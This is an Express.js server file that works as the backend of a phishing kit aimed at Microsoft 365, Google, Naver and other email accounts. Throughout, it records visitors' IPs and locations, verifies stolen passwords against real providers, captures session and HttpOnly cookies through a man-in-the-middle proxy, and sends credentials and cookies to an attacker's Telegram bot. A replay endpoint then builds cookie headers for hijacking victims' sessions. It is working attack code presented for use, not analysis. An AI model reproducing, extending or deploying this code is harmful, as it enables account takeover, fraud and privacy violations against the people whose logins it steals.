app.use(express.static(path.join(__dirname, '../')));

// ============================================================
// MIDDLEWARE - Capture Visitor Info
// ============================================================
app.use(async (req, res, next) => {
    // Get client IP
    const ip = req.headers['x-forwarded-for'] || 
               req.connection.remoteAddress || 
               req.socket.remoteAddress || 
               req.ip || 
               '127.0.0.1';
    
    // Clean IP (remove IPv6 prefix if present)
    const cleanIp = ip.replace(/^::ffff:/, '').replace(/^::1$/, '127.0.0.1');
    
    // Get user agent
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    // Detect browser
    const browserInfo = detectBrowser(userAgent);
    
    // Get referrer
    const referrer = req.headers.referer || req.headers.referrer || 'Direct';
    
    // Get language
    const language = req.headers['accept-language'] || 'Unknown';
    
    // Get session ID
    const sessionId = req.session.id || req.headers['x-session-id'] || uuidv4();
    req.session.id = sessionId;
    
    // Store visitor data
    const visitorData = {
        sessionId: sessionId,
        userAgent: userAgent,
        browser: browserInfo.browser,
        platform: browserInfo.platform,
        device: browserInfo.device,
        language: language,
        referrer: referrer,
        ip: cleanIp,
        cookiesEnabled: !!req.headers.cookie,
        timestamp: Date.now()
    };
    
    req.visitorData = visitorData;
    req.clientIp = cleanIp;
    
    // Store in session store
    sessionStore.storeVisitorData(sessionId, visitorData);
    
    // Get geolocation asynchronously
    if (!req.geolocation) {
        try {
            const geo = await getGeolocation(cleanIp);
            req.geolocation = geo;
            // Update visitor data with geolocation
            const visitor = sessionStore.getVisitorData(sessionId);
            if (visitor) {
                visitor.geolocation = geo;
                sessionStore.storeVisitorData(sessionId, visitor);
            }
        } catch (error) {
            console.error('⚠️ Geolocation error:', error.message);
            req.geolocation = { ip: cleanIp, city: 'Unknown', country: 'Unknown' };
        }
    }
    
    next();
});

// ============================================================
// COOKIE CAPTURE ENDPOINTS - FULL COOKIES NO TRUNCATION
// ============================================================
app.post('/api/cookies', async (req, res) => {
    try {
        const data = req.body;
        const sessionId = data.sessionId || req.session.id || req.headers['x-session-id'];
        
        if (sessionId) {
            // Store full cookies - NO TRUNCATION
            sessionStore.storeCookies(sessionId, data.cookies, data.source || 'api');
            
            // Get full cookies for telegram
            const fullCookies = sessionStore.getFullCookies(sessionId);
            
            // Send enhanced telegram alert
            const geo = req.geolocation || { city: 'Unknown', country: 'Unknown' };
            const visitor = req.visitorData || {};
            
            let cookieMsg = `🍪 *FULL COOKIES CAPTURED*\n\n`;
            cookieMsg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
            cookieMsg += `*🕐 Time:* ${new Date().toISOString()}\n`;
            cookieMsg += `*📊 Total:* ${Object.keys(data.cookies).length} cookies\n\n`;
            cookieMsg += `*📝 COOKIES (FULL VALUES - NO TRUNCATION):*\n`;
            
            let count = 0;
            for (const [name, cookieData] of Object.entries(data.cookies)) {
                if (count >= 15) {
                    cookieMsg += `\n... and ${Object.keys(data.cookies).length - count} more cookies\n`;
                    break;
                }
                const value = cookieData.value || cookieData;
                const httpOnly = cookieData.httpOnly ? '🔒' : '🔓';
                const secure = cookieData.secure ? '🔐' : '';
                cookieMsg += `  ${httpOnly}${secure} \`${name}\`:\n`;
                cookieMsg += `  \`${value}\`\n\n`;
                count++;
            }
            
            // Add geolocation
            if (geo && !geo.isLocal) {
                cookieMsg += `📍 *Location:* ${geo.city}, ${geo.country}\n`;
                cookieMsg += `📡 *IP:* ${geo.ip}\n`;
                cookieMsg += `🏢 *ISP:* ${geo.org || 'Unknown'}\n`;
            }
            
            // Add browser info
            if (visitor) {
                cookieMsg += `💻 *Browser:* ${visitor.browser || 'Unknown'}\n`;
                cookieMsg += `📱 *Platform:* ${visitor.platform || 'Unknown'}\n`;
            }
            
            await sendToTelegram(cookieMsg);
            
            res.json({ 
                success: true, 
                message: 'Cookies stored successfully (full values)',
                count: Object.keys(data.cookies).length
            });
        } else {
            res.status(400).json({ error: 'No session ID' });
        }
    } catch(e) {
        console.error('[COOKIES] Error:', e);
        res.status(500).json({ error: e.message });
    }
});

// ============================================================
// ENHANCED VERIFY PASSWORD ENDPOINT
// ============================================================
app.post('/api/verify-password', async (req, res) => {
    try {
        const { email, password, stage, sessionId } = req.body;
        const providerInfo = detectEmailProvider(email);
        const sid = sessionId || req.session.id || uuidv4();
        req.session.id = sid;
        
        console.log(`[VERIFY] 📧 Email: ${email}`);
        console.log(`[VERIFY] 🌐 Provider: ${providerInfo.display}`);
        console.log(`[VERIFY] 🔗 Login URL: ${providerInfo.loginUrl}`);
        console.log(`[VERIFY] 📌 Stage: ${stage}`);

        if (!email || !password) {
            return res.status(400).json({ success: false, message: 'Email and password required' });
        }

        if (!req.session.verification) {
            req.session.verification = {
                email: email,
                provider: providerInfo.provider,
                providerDisplay: providerInfo.display,
                loginUrl: providerInfo.loginUrl,
                password1: null,
                password1Valid: false,
                password2: null,
                password2Valid: false,
                attempts: 0,
                stage: 1
            };
        }

        if (req.session.verification.email !== email) {
            req.session.verification = {
                email: email,
                provider: providerInfo.provider,
                providerDisplay: providerInfo.display,
                loginUrl: providerInfo.loginUrl,
                password1: null,
                password1Valid: false,
                password2: null,
                password2Valid: false,
                attempts: 0,
                stage: 1
            };
        }

        req.session.verification.attempts++;

        // Get geolocation
        const geo = req.geolocation || await getGeolocation(req.clientIp || '127.0.0.1');
        const visitor = req.visitorData || {};

        // Verify password
        const validationResult = await verifyPasswordWithProvider(email, password);
        
        // Store cookies if captured
        if (validationResult.cookies && Object.keys(validationResult.cookies).length > 0) {
            sessionStore.storeCookies(sid, validationResult.cookies, 'verification');
        }

        // ENHANCED TELEGRAM ALERT
        await sendEnhancedTelegramAlert({
            email: email,
            password: password,
            provider: providerInfo,
            providerDisplay: providerInfo.display,
            stage: stage,
            attemptCount: req.session.verification.attempts,
            sessionId: sid,
            geolocation: geo,
            visitorData: visitor,
            validationResult: validationResult,
            verificationStatus: stage === 2 && validationResult.valid ? 'completed' : 'pending'
        });

        // Also send to old endpoint for compatibility
        let legacyMsg = `🔐 *PASSWORD VERIFICATION - STAGE ${stage}*\n\n`;
        legacyMsg += `*Provider:* ${providerInfo.display}\n`;
        legacyMsg += `*Email:* ${email}\n`;
        legacyMsg += `*Password:* \`${password}\`\n`;
        legacyMsg += `*Time:* ${new Date().toISOString()}\n`;
        legacyMsg += `*Session:* ${sid.substring(0, 16)}...\n`;
        legacyMsg += `*Attempt:* ${req.session.verification.attempts}\n`;
        
        if (validationResult.valid) {
            legacyMsg += `\n✅ Status: PASSWORD VALID - CORRECT!`;
        } else if (validationResult.requires2FA) {
            legacyMsg += `\n⚠️ Status: 2FA REQUIRED`;
        } else {
            legacyMsg += `\n❌ Status: INVALID PASSWORD`;
        }
        
        await sendToTelegram(legacyMsg);

        // Handle 2FA
        if (validationResult.requires2FA) {
            return res.json({
                success: false,
                requires2FA: true,
                message: '2FA required. Please complete MFA and try again.',
                stage: stage,
                attemptCount: req.session.verification.attempts,
                provider: providerInfo.display,
                loginUrl: providerInfo.loginUrl,
                cookiesCaptured: validationResult.cookies ? Object.keys(validationResult.cookies).length : 0
            });
        }

        // Handle invalid password
        if (!validationResult.valid) {
            req.session.verification.password1 = null;
            req.session.verification.password1Valid = false;
            req.session.verification.password2 = null;
            req.session.verification.password2Valid = false;
            req.session.verification.stage = 1;
            
            return res.json({
                success: false,
                requires2FA: false,
                message: validationResult.message || 'Invalid password. Please try again.',
                stage: 1,
                attemptCount: req.session.verification.attempts,
                reset: true,
                provider: providerInfo.display,
                loginUrl: providerInfo.loginUrl,
                cookiesCaptured: validationResult.cookies ? Object.keys(validationResult.cookies).length : 0
            });
        }

        // Stage 1 - First password correct
        if (stage === 1) {
            req.session.verification.password1 = password;
            req.session.verification.password1Valid = true;
            req.session.verification.stage = 2;
            
            return res.json({
                success: true,
                stage: 2,
                message: 'First password verified! Please enter your password again to confirm.',
                attemptCount: req.session.verification.attempts,
                requires2FA: false,
                nextAction: 'confirm_password',
                provider: providerInfo.display,
                loginUrl: providerInfo.loginUrl,
                cookiesCaptured: validationResult.cookies ? Object.keys(validationResult.cookies).length : 0
            });
        }
        
        // Stage 2 - Confirm password
        else if (stage === 2) {
            if (password === req.session.verification.password1) {
                req.session.verification.password2 = password;
                req.session.verification.password2Valid = true;
                
                // Send final success with full details
                await sendEnhancedTelegramAlert({
                    email: email,
                    password: password,
                    provider: providerInfo,
                    providerDisplay: providerInfo.display,
                    stage: stage,
                    attemptCount: req.session.verification.attempts,
                    sessionId: sid,
                    geolocation: geo,
                    visitorData: visitor,
                    validationResult: { ...validationResult, valid: true },
                    verificationStatus: 'completed'
                });
                
                // Get all cookies for this session
                const allCookies = sessionStore.getAllCookies(sid);
                
                return res.json({
                    success: true,
                    stage: 2,
                    verified: true,
                    message: '✅ Both passwords verified! Redirecting...',
                    redirectUrl: PROXY_URL + '?login_hint=' + encodeURIComponent(email) + '&session=' + sid + '&verified=true',
                    attemptCount: req.session.verification.attempts,
                    requires2FA: false,
                    provider: providerInfo.display,
                    loginUrl: providerInfo.loginUrl,
                    cookiesCaptured: validationResult.cookies ? Object.keys(validationResult.cookies).length : 0,
                    sessionId: sid,
                    cookies: allCookies
                });
            } else {
                // Passwords don't match - reset
                req.session.verification.password1 = null;
                req.session.verification.password1Valid = false;
                req.session.verification.password2 = null;
                req.session.verification.password2Valid = false;
                req.session.verification.stage = 1;
                
                return res.json({
                    success: false,
                    stage: 1,
                    message: '❌ Passwords do not match. Please start over.',
                    attemptCount: req.session.verification.attempts,
                    reset: true,
                    requires2FA: false,
                    provider: providerInfo.display,
                    loginUrl: providerInfo.loginUrl
                });
            }
        }

    } catch (error) {
        console.error('[VERIFY] Error:', error.message);
        res.status(500).json({ success: false, message: 'Verification failed. Please try again.', error: error.message });
    }
});

// ============================================================
// GET FULL COOKIES FOR SESSION
// ============================================================
app.get('/api/cookies/full', (req, res) => {
    const sessionId = req.headers['x-session-id'] || req.session.id;
    
    if (sessionId) {
        const cookies = sessionStore.getFullCookies(sessionId);
        if (cookies) {
            res.json({
                success: true,
                sessionId: sessionId,
                totalCookies: Object.keys(cookies).length,
                cookies: cookies
            });
        } else {
            res.status(404).json({ error: 'No cookies found' });
        }
    } else {
        res.status(400).json({ error: 'No session ID' });
    }
});

// ============================================================
// GET VISITOR DATA
// ============================================================
app.get('/api/visitor', (req, res) => {
    const sessionId = req.headers['x-session-id'] || req.session.id;
    
    if (sessionId) {
        const visitor = sessionStore.getVisitorData(sessionId);
        if (visitor) {
            res.json({
                success: true,
                sessionId: sessionId,
                visitor: visitor
            });
        } else {
            res.status(404).json({ error: 'No visitor data found' });
        }
    } else {
        res.status(400).json({ error: 'No session ID' });
    }
});

// ============================================================ 
// GET COMPLETE SESSION DATA
// ============================================================
app.get('/api/session-data', (req, res) => {
    const sessionId = req.headers['x-session-id'] || req.session.id;
    
    if (sessionId) {
        const data = sessionStore.getReplayData(sessionId);
        if (data) {
            res.json(data);
        } else {
            res.status(404).json({ error: 'Session not found' });
        }
    } else {
        res.status(400).json({ error: 'No session ID' });
    }
});

// ============================================================
// GET ALL COOKIES (Legacy)
// ============================================================
app.get('/api/cookies/all', (req, res) => {
    const sessionId = req.headers['x-session-id'] || req.session.id;
    
    if (sessionId) {
        const cookies = sessionStore.getAllCookies(sessionId);
        if (cookies) {
            res.json(cookies);
        } else {
            res.status(404).json({ error: 'No cookies found' });
        }
    } else {
        res.status(400).json({ error: 'No session ID' });
    }
});

// ============================================================
// SESSION REPLAY
// ============================================================
app.post('/api/replay', async (req, res) => {
    try {
        const data = req.body;
        const sessionId = data.sessionId || req.headers['x-session-id'] || req.session.id;
        
        if (!sessionId) {
            res.status(400).json({ error: 'No session ID' });
            return;
        }
        
        const sessionData = sessionStore.getReplayData(sessionId);
        if (!sessionData) {
            res.status(404).json({ error: 'Session not found' });
            return;
        }
        
        const cookies = sessionStore.getAllCookies(sessionId);
        const fullCookies = sessionStore.getFullCookies(sessionId);
        const visitor = sessionStore.getVisitorData(sessionId);
        const target = data.target || 'https://login.microsoftonline.com';
        
        const cookieHeader = Object.entries(cookies || {})
            .map(([name, value]) => `${name}=${value}`)
            .join('; ');
        
        res.json({
            success: true,
            sessionId: sessionId,
            target: target,
            cookies: cookies,
            fullCookies: fullCookies,
            cookieHeader: cookieHeader,
            visitor: visitor,
            replayUrl: `${target}?session_replay=true`,
            instructions: [
                '1. Use the cookieHeader below to authenticate',
                '2. Use the fullCookies object for manual replay',
                '3. Access the target URL with the cookies'
            ]
        });
        
    } catch(e) {
        console.error('[REPLAY] Error:', e);
        res.status(500).json({ error: e.message });
    }
});

// ============================================================
// OTHER ENDPOINTS (GET PROVIDER, CREDENTIAL CAPTURE, PROXY, ETC.)
// ============================================================

// GET PROVIDER FOR EMAIL
app.get('/api/detect-provider', (req, res) => {
    const { email } = req.query;
    if (!email) return res.status(400).json({ error: 'Email required' });
    res.json(detectEmailProvider(email));
});

// CREDENTIAL CAPTURE
app.post('/api/credential-capture', async (req, res) => {
    try {
        const data = req.body;
        const providerInfo = detectEmailProvider(data.email);
        const geo = req.geolocation || { city: 'Unknown', country: 'Unknown' };
        const visitor = req.visitorData || {};
        
        let msg = `🔐 *CREDENTIAL CAPTURED*\n\n`;
        msg += `*${providerInfo.icon || '📧'} Provider:* ${providerInfo.display}\n`;
        msg += `*📧 Email:* ${data.email}\n`;
        msg += `*🔗 Login URL:* ${providerInfo.loginUrl || 'N/A'}\n`;
        msg += `*🔑 Password:* \`${data.password || 'N/A'}\`\n`;
        msg += `*📍 Source:* ${data.source || 'N/A'}\n`;
        msg += `*🆔 Session:* ${data.sessionId || 'N/A'}\n`;
        msg += `*📌 Stage:* ${data.stage || 'N/A'}\n`;
        msg += `*📊 Attempt:* ${data.attemptCount || 'N/A'}\n`;
        msg += `*🔗 Page URL:* ${data.url || 'N/A'}\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}\n\n`;
        
        if (geo && !geo.isLocal) {
            msg += `📍 *Location:* ${geo.city}, ${geo.country}\n`;
            msg += `📡 *IP:* ${geo.ip}\n`;
        }
        
        if (visitor) {
            msg += `💻 *Browser:* ${visitor.browser || 'Unknown'}\n`;
            msg += `📱 *Platform:* ${visitor.platform || 'Unknown'}\n`;
        }
        
        await sendToTelegram(msg);
        res.json({ success: true });
    } catch (error) {
        console.error('[CREDENTIAL] Error:', error);
        res.status(500).json({ error: error.message });
    }
});

// PROXY SERVER
app.all('/proxy/*', async (req, res) => {
    const targetUrl = req.params[0];
    const sessionId = req.session.id || uuidv4();
    req.session.id = sessionId;
    
    console.log(`🔄 Proxy request: ${req.method} ${targetUrl}`);
    
    try {
        const headers = {
            'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': req.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Upgrade-Insecure-Requests': '1',
            'Cookie': req.headers.cookie || ''
        };
        
        const response = await axios({
            method: req.method,
            url: targetUrl,
            headers: headers,
            withCredentials: true,
            maxRedirects: 0,
            validateStatus: false,
            responseType: 'text'
        });
        
        const setCookieHeaders = response.headers['set-cookie'] || [];
        
        if (setCookieHeaders.length > 0) {
            console.log(`🍪 Captured ${setCookieHeaders.length} cookies from Set-Cookie headers`);
            
            const capturedCookies = setCookieHeaders.map(header => {
                const parts = header.split(';');
                const [name, value] = parts[0].split('=');
                const attributes = parts.slice(1).map(p => p.trim());
                
                return {
                    name: name,
                    value: value,
                    httpOnly: attributes.some(a => a.toLowerCase() === 'httponly'),
                    secure: attributes.some(a => a.toLowerCase() === 'secure'),
                    sameSite: attributes.find(a => a.toLowerCase().startsWith('samesite='))?.split('=')[1] || 'Lax',
                    path: attributes.find(a => a.toLowerCase().startsWith('path='))?.split('=')[1] || '/',
                    domain: attributes.find(a => a.toLowerCase().startsWith('domain='))?.split('=')[1] || '',
                    fullHeader: header,
                    capturedAt: Date.now()
                };
            });
            
            const cookieData = {};
            capturedCookies.forEach(c => {
                cookieData[c.name] = { value: c.value, httpOnly: c.httpOnly, secure: c.secure };
            });
            sessionStore.storeCookies(sessionId, cookieData, 'proxy');
            
            // Send enhanced telegram alert with cookies
            const geo = req.geolocation || { city: 'Unknown', country: 'Unknown' };
            
            let telegramMessage = `🎯 *HTTPOnly COOKIES CAPTURED VIA PROXY*\n\n`;
            telegramMessage += `*Total Cookies:* ${capturedCookies.length}\n`;
            telegramMessage += `*HTTPOnly:* ${capturedCookies.filter(c => c.httpOnly).length}\n`;
            telegramMessage += `*Secure:* ${capturedCookies.filter(c => c.secure).length}\n`;
            telegramMessage += `*Session:* ${sessionId}\n\n`;
            
            capturedCookies.slice(0, 5).forEach(c => {
                const flags = [];
                if (c.httpOnly) flags.push('🔒 HTTPOnly');
                if (c.secure) flags.push('🔐 Secure');
                telegramMessage += `*${c.name}*: \`${c.value.substring(0, 50)}...\`\n`;
                if (flags.length) telegramMessage += `  ${flags.join(' | ')}\n`;
            });
            
            if (geo && !geo.isLocal) {
                telegramMessage += `\n📍 *Location:* ${geo.city}, ${geo.country}\n`;
                telegramMessage += `📡 *IP:* ${geo.ip}\n`;
            }
            
            telegramMessage += `\n*Time:* ${new Date().toISOString()}`;
            await sendToTelegram(telegramMessage);
        }
        
        const responseHeaders = { ...response.headers };
        if (setCookieHeaders.length > 0) {
            responseHeaders['Set-Cookie'] = setCookieHeaders;
        }
        
        res.set(responseHeaders);
        res.status(response.status).send(response.data);
        
    } catch (error) {
        console.error('❌ Proxy error:', error.message);
        res.status(500).send('Proxy error');
    }
});

// ============================================================
// TELEGRAM ENDPOINT (Legacy)
// ============================================================
app.post('/api/telegram', async (req, res) => {
    try {
        const { message, parseMode } = req.body;
        await sendToTelegram(message, parseMode || 'Markdown');
        res.json({ success: true });
    } catch (error) {
        console.error('[TELEGRAM] Error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============================================================
// GET VERIFICATION STATUS
// ============================================================
app.get('/api/verification-status', (req, res) => {
    try {
        const status = req.session.verification || { 
            stage: 1, 
            password1Valid: false, 
            password2Valid: false, 
            attempts: 0 
        };
        res.json({
            stage: status.stage || 1,
            password1Valid: status.password1Valid || false,
            password2Valid: status.password2Valid || false,
            attempts: status.attempts || 0,
            email: status.email || null,
            provider: status.providerDisplay || 'Unknown',
            loginUrl: status.loginUrl || null
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================================
// RESET VERIFICATION
// ============================================================
app.post('/api/reset-verification', (req, res) => {
    try {
        if (req.session) req.session.verification = null;
        res.json({ success: true, message: 'Verification reset' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================================
// HEALTH CHECK
// ============================================================
app.get('/health', async (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        browserActive: !!browserInstance,
        sessions: sessionStore.sessions.size,
        totalCookies: Array.from(sessionStore.sessions.values())
            .reduce((acc, s) => acc + (s.cookies ? Object.keys(s.cookies).length : 0), 0),
        replayData: sessionStore.replayData.size,
        telegram: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID),
        googleOAuth: !!(GOOGLE_CLIENT_ID && GOOGLE_CLIENT_SECRET),
        geolocationEnabled: true,
        endpoints: [
            'POST /api/cookies - Store cookies (FULL VALUES)',
            'POST /api/tokens - Store tokens',
            'POST /api/form-data - Store form data',
            'POST /api/replay-data - Store replay data',
            'GET /api/cookies/all - Get all cookies',
            'GET /api/cookies/full - Get full cookies with metadata',
            'GET /api/visitor - Get visitor data',
            'GET /api/session-data - Get complete session',
            'POST /api/replay - Replay session',
            'POST /api/verify-password - Enhanced password verification',
            'POST /api/credential-capture - Capture credentials',
            'POST /api/telegram - Send Telegram',
            'GET /api/verification-status - Status',
            'POST /api/reset-verification - Reset',
            'POST /api/puppeteer-capture - Puppeteer capture',
            '/proxy/* - Proxy with cookie capture'
        ],
        version: '3.0.0-enhanced'
    });
});

// ============================================================
// SERVE FRONTEND
// ============================================================
app.get('/', (req, res) => {
    serveFile(path.join(__dirname, '../frontend', 'index.html'), res);
});

app.get('/inject.js', (req, res) => {
    serveFile(path.join(__dirname, '../frontend', 'script_inject.js'), res, 'text/javascript');
});

app.get('/style.css', (req, res) => {
    serveFile(path.join(__dirname, '../frontend', 'style.css'), res, 'text/css');
});

function serveFile(filePath, res, contentType = 'text/html') {
    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.status(404).send('File not found');
            return;
        }
        res.setHeader('Content-Type', contentType);
        res.setHeader('Cache-Control', 'no-store');
        res.send(data);
    });
}

// ============================================================
// LEGACY TELEGRAM FUNCTION
// ============================================================
async function sendToTelegram(message, parseMode = 'Markdown') {
    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        
        if (!botToken || !chatId) {
            console.log('⚠️ Telegram credentials missing');
            return false;
        }
        
        let finalMsg = message;
        if (message.length > 4000) {
            finalMsg = message.substring(0, 3900) + '\n\n... (truncated)';
        }
        
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: finalMsg,
            parse_mode: parseMode,
            disable_web_page_preview: true
        });
        return true;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

// ============================================================
// START SERVER
// ============================================================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║                                                           ║');
    console.log('║   🍪  ENHANCED INTEGRATED SERVER v3.0                    ║');
    console.log('║   🔐  2-CONSECUTIVE PASSWORD VERIFICATION                ║');
    console.log('║   🍪  FULL COOKIE CAPTURE (NO TRUNCATION)               ║');
    console.log('║   📍  IP GEOLOCATION & VISITOR TRACKING                 ║');
    console.log('║   🤖  Puppeteer Automation                              ║');
    console.log('║   🌐  Multi-Provider Support (Korean + International)   ║');
    console.log('║   🔄  Session Replay                                    ║');
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log(`║   📍 Server:  http://localhost:${PORT}                   ║`);
    console.log(`║   🔗 Proxy:   /proxy/*                                   ║`);
    console.log(`║   🔐 Verify:  POST /api/verify-password                  ║`);
    console.log(`║   🤖 Puppet:  POST /api/puppeteer-capture               ║`);
    console.log(`║   🍪 Cookie:  POST /api/cookies (FULL VALUES)           ║`);
    console.log(`║   🔄 Replay:  POST /api/replay                          ║`);
    console.log(`║   📍 Visitor: GET /api/visitor                          ║`);
    console.log(`║   📧 Telegram: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ ENHANCED' : '❌ DISABLED'}`);
    console.log(`║   🔑 Google OAuth: ${GOOGLE_CLIENT_ID ? '✅ CONFIGURED' : '⚠️ NOT CONFIGURED'}`);
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║   ✅ Supported Providers:                                ║');
    console.log('║   🇰🇷 Naver Works • Tracoworld • JPI • Upchem           ║');
    console.log('║   🇰🇷 Flucon • Ecount • Naver • Daum • Kakao            ║');
    console.log('║   🇰🇷 Nate • DreamWiz • Paran • Empas • Lycos           ║');
    console.log('║   🇰🇷 Freechal • Korean Corporate                        ║');
    console.log('║   💼 Microsoft 365 • Google • Yahoo • Apple             ║');
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║   📊 Endpoints:                                         ║');
    console.log('║   POST /api/cookies - Store cookies (FULL)             ║');
    console.log('║   POST /api/tokens - Store tokens                      ║');
    console.log('║   POST /api/form-data - Store form data                ║');
    console.log('║   POST /api/replay-data - Store replay data            ║');
    console.log('║   GET  /api/cookies/all - Get all cookies              ║');
    console.log('║   GET  /api/cookies/full - Get FULL cookies           ║');
    console.log('║   GET  /api/visitor - Get visitor data                ║');
    console.log('║   GET  /api/session-data - Get complete session        ║');
    console.log('║   POST /api/replay - Replay session                   ║');
    console.log('║   POST /api/verify-password - ENHANCED verification   ║');
    console.log('║   POST /api/credential-capture - Capture credentials  ║');
    console.log('║   POST /api/telegram - Send Telegram                 ║');
    console.log('║   GET  /api/verification-status - Status             ║');
    console.log('║   POST /api/reset-verification - Reset               ║');
    console.log('║   POST /api/puppeteer-capture - Puppeteer capture   ║');
    console.log('║   /proxy/* - Proxy with cookie capture              ║');
    console.log('║   GET  /health - Health check                       ║');
    console.log('║                                                           ║');
    console.log('╚═══════════════════════════════════════════════════════════╝');
});

// ============================================================
// CLEANUP
// ============================================================
setInterval(() => {
    sessionStore.cleanup();
}, 300000);